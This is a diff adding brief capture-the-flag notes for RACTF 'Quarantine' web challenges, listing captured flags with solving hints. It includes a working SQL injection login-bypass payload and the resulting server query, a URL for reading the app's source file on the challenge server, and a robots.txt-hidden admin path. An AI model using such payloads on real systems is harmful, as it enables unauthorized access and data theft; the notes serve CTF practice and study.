@@ -1,0 +1,17 @@
+====== Quarantine
+SQL Injection: ractf{Y0u_B3tt3r_N0t_h4v3_us3d_sqlm4p} -- Access to Quarantine
+- Server Query: select * from users where password = 'pwd'
+- Server Query: select * from users where password = '' or password=(select max(password) from users) or '1'='2'
+- Payload: ' or password=(select max(password) from users) or '1'='2
+
+====== Quarantine: Finding Server Information
+Query Video File: ractf{qu3ry5tr1ng_m4n1pul4ti0n} -- Get information
+URL: http://95.216.233.106:62020/watch/app.py
+
+====== Quarantine - Hidden Information
+robots.txt: ractf{1m_n0t_4_r0b0T} -- This is THE REAL FLAG (finally)
+- /robots.txt hiddens a /admin-stash from search engines, which has the flag
+
+====== Quarantine - Getting Admin
+- Advanced SQL Injection to get all admin passwords
+FINAL: ractf{j4va5cr1pt_w3b_t0ken}
